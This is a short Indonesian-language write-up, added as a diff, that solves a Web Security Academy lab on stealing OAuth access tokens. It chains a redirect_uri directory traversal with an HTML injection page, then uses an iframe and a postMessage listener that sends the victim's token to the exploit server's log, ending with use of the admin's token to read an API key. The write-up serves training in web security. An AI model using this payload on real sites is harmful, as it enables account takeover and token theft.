@@ -1,0 +1,24 @@
+1. Buat request untuk mendapatkan alur Oauth yg meliputi redirect_uri
+2. Cari celah pada bagian halaman yang mampu mengekspose url si user ke server eksternal baik itu menggunaka javascript,xss, ataupun html injections(pada kasus ini menggunakan html injection dan javascript untuk mengambil token)
+3. Ambil bagian request yang mengandung alur Oaut dari point 1 lalu terapkan directory traversal yang kurang lebih seperti ini:
+  "https://oauth-[ID LINK OAUTH].oauth-server.net/auth?client_id=[ID CLIENT]&redirect_uri=https://[ID LAB].web-security-academy.net/oauth-callback/../[HALAMAN DENGAN CELAH PONT 2]"
+dan versi fullnya
+    <iframe src="https://oauth-0ad600dd045b8afd8461849e02170023.oauth-server.net/auth?client_id=m5taddxazh4iqbc77w4md&redirect_uri=https://0ac2007c040f8aa884f48641001c0091.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=932417403&scope=openid%20profile%20email""></iframe>
+
+
+<script>
+
+   window.addEventListener('message', function(e) {
+
+    if (e.data && e.data.data) { // Pastikan datanya ada dulu
+
+        fetch("/?TOKEN_CURIAN=" + encodeURIComponent(e.data.data));
+
+    }
+
+}, false);
+
+</script> 
+4. Anda akan mendapati di log acces sserver exploit bahwa anda mendapatkan acces token si admin
+5. Cari request http yang melakukan authorization menggunakan type bearer lalu letakkan acces tokennya disana dan kita akan melihat apikey milik admin di bagianresponse
+6. Submit di lab dan selesai
